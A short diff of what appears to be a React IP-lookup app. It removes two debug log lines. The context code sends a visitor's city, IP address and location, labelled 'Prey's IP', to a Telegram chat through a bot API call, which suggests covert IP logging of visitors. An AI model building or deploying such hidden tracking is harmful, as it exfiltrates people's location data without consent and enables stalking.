@@ -30,7 +30,6 @@ function App() {
       message += `<b>City:</b> ${res.data.city}\n`;
       message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
       message += `<b>Location:</b> ${res.data.loc}\n`;
-      console.log(res);
       axios.post(`${URL}/sendPhoto`, {
         chat_id: CHAT_ID,
         photo: "https://ibb.co/X7VKzrP",
@@ -42,7 +41,6 @@ function App() {
   const { register, handleSubmit } = useForm<FormValue>();
   const [ipAdress, setIpAdress] = useState("");
   const { data } = useGetLocationQuery(ipAdress) as { data: IpData };
-  console.log(data);
   const formSubmit = (data: FormValue) => {
     setIpAdress(data.ipAdress);
   };
